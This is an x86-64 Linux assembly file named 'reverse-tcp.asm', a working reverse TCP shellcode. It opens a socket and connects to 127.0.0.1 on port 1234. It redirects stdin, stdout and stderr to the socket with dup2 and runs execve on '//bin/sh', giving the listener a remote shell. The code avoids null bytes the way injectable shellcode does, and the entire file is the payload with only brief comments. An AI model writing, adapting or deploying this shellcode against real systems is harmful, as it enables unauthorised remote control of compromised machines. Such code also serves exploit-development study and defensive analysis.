; reverse-tcp.asm - An example of connection TCP in reverse
section .text
	global _start
_start:
	nop
; socket parameters (2, 1, 0)
	xor rax, rax
	add rax, 41
	xor rdi, rdi
	add rdi, 2
	xor rsi, rsi
	inc rsi
	xor rdx, rdx
	syscall
; return socket on RAX
	mov rdi, rax
;structure  
	xor rax, rax
	push dword 0x0100007f	; ip addres 
	push word 0xd204		; port
	push word 0x02			; AF_INET - IPv4 Protocol
; move structure to rsi register
	mov rsi, rsp		; save second argument
	xor rdx, rdx
	add rdx, 16			; size of structure
	xor rax, rax
	add rax, 42			; connect function syscall
	syscall
; dup2 stdin
	xor rax, rax
	add rax, 33		; syscall dup2
	xor rsi, rsi	; (0) stdin
	syscall
;dup2 stdout
	xor rax, rax
	add rax, 33
	inc rsi			; (1) stdout
	syscall
; dup2 stderr
	xor rax, rax
	add rax, 33
	inc rsi			; (2) stderr
	syscall
; execve
	xor rax, rax
	push rax
	mov rdx, rsp
	mov rbx, 0x68732f6e69622f2f
	push rbx
	mov rdi, rsp
	push rax
	push rdi
	mov rsi, rsp
	add rax, 59
	syscall
